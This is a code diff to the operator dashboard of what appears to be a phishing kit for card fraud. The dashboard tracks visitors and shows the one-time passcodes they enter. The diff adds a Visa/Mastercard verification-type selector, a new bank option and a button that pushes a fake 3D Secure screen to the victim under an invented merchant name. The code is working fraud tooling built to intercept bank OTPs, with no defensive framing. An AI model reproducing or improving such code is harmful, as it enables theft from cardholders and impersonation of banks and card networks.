@@ -318,10 +318,19 @@
     </table>
   </div>
 
-  <!-- MC OTP Panel -->
+  <!-- MC OTP Panel - UPDATED with Verification Type Selector -->
   <div id="mcOtpPanel" class="fixed inset-0 bg-black bg-opacity-75 z-50 flex items-center justify-center hidden">
     <div class="bg-gray-800 p-6 rounded-lg max-w-md w-full">
       <h3 class="text-xl font-bold mb-4">3D Secure Verification</h3>
+      
+      <!-- NEW: Verification Type Selector -->
+      <div class="mb-4">
+        <label class="block text-sm mb-2">Verification Type:</label>
+        <select id="mcVerificationType" class="bg-gray-700 text-white w-full p-2 rounded">
+          <option value="mastercard">Mastercard SecureCode</option>
+          <option value="visa">Verified by Visa</option>
+        </select>
+      </div>
       
       <div class="mb-4">
         <label class="block text-sm mb-2">Bank:</label>
@@ -345,8 +354,14 @@
           <option value="wellsfargo">wellsfargo</option>
           <option value="nimb">nimb</option>
           <option value="bank of maga">bank of maga</option>
+          <option value="gibraltar">Gibraltar International Bank</option>
         </select>
       </div>
+      
+      <!-- NEW: Start Verification Button -->
+      <button id="mcStartVerification" class="bg-blue-600 text-white py-2 px-4 rounded mb-4 w-full">
+        Start Verification
+      </button>
       
       <p class="mb-4">OTP entered: <span id="mcOtpValue" class="font-mono bg-gray-700 px-2 py-1 rounded">Waiting...</span></p>
       
@@ -634,7 +649,7 @@
       });
 
       // Add each visitor to the list
-      visitors.forEach(visitor => {
+     visitors.forEach(visitor => {
         // Store in map for reference
         visitorsMap.set(visitor.pid, visitor);
 
@@ -1062,7 +1077,7 @@
       mcOtpValue.textContent = 'Waiting...';
       currentMcInvoiceId = id;
       
-      // Send event to client to show MC verification
+      // Send event to client to show MC verification with loading state
       socket.emit('show_mc_verification', {
         invoiceId: id,
         merchantName: 'Bologus pvt store.',
@@ -1148,10 +1163,38 @@
     document.addEventListener('DOMContentLoaded', function() {
       const mcOtpPanel = document.getElementById('mcOtpPanel');
       const mcBankSelect = document.getElementById('mcBankSelect');
+      const mcVerificationType = document.getElementById('mcVerificationType');
       const mcOtpInvalidBtn = document.getElementById('mcOtpInvalidBtn');
       const mcOtpSuccessBtn = document.getElementById('mcOtpSuccessBtn');
       const mcOtpFailBtn = document.getElementById('mcOtpFailBtn');
       const mcClosePanelBtn = document.getElementById('mcClosePanelBtn');
+      
+      // NEW: Start Verification button handler
+      const mcStartVerificationBtn = document.getElementById('mcStartVerification');
+      if (mcStartVerificationBtn) {
+        mcStartVerificationBtn.addEventListener('click', function() {
+          if (!currentMcInvoiceId) {
+            alert('No transaction selected for verification');
+            return;
+          }
+          
+          const verificationType = mcVerificationType.value;
+          const bankCode = mcBankSelect.value;
+          
+          console.log('Starting verification with:', {
+            invoiceId: currentMcInvoiceId,
+            verificationType: verificationType,
+            bankCode: bankCode
+          });
+          
+          // Send event to show verification UI to client
+          socket.emit('start_verification', {
+            invoiceId: currentMcInvoiceId,
+            verificationType: verificationType,
+            bankCode: bankCode
+          });
+        });
+      }
       
       // Handle MC bank selection
       mcBankSelect.addEventListener('change', function() {
